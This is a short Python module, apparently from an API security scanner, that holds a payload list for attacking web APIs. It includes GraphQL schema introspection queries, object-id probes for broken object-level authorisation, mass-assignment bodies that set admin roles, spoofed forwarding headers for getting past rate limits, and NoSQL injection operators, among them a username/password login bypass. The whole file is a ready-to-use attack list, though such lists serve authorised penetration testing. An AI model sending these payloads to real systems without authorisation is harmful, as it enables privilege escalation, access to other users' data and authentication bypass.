"""API attack payloads — GraphQL introspection, BOLA, rate-limit bypass, mass assignment."""

NAME = "API Attacks"
DESCRIPTION = "API-specific payloads for GraphQL, BOLA, mass assignment, and rate-limit bypass"
RISK = "MEDIUM"

PAYLOADS = [
    # GraphQL introspection
    '{"query":"query{__schema{types{name fields{name}}}}"}',
    '{"query":"{__schema{queryType{name}mutationType{name}types{name fields{name args{name}type{name}}}}}"}',
    # GraphQL field suggestion
    '{"query":"{__schema{types{name fields{name}}}}"}',
    # BOLA / IDOR
    "id=1",
    "user_id=1",
    "account_id=1",
    "order_id=1",
    "document_id=1",
    "file_id=1",
    # Mass assignment
    '{"role":"admin"}',
    '{"is_admin":true}',
    '{"admin":true}',
    '{"permissions":"*"}',
    '{"access_level":"admin"}',
    '{"user":{"role":"admin"}}',
    '{"admin":1}',
    # Rate-limit bypass headers
    "X-Forwarded-For: 127.0.0.1",
    "X-Forwarded-For: 0.0.0.0",
    "X-Forwarded-For: 10.0.0.1",
    "X-Real-IP: 127.0.0.1",
    "X-Originating-IP: 127.0.0.1",
    "X-Remote-IP: 127.0.0.1",
    "X-Client-IP: 127.0.0.1",
    "X-Host: 127.0.0.1",
    "X-Forwarded-Host: 127.0.0.1",
    # NoSQL injection
    '{"$gt":""}',
    '{"$ne":""}',
    '{"$where":"1==1"}',
    '{"username":{"$gt":""},"password":{"$gt":""}}',
    '{"email":{"$regex":".*"}}',
]
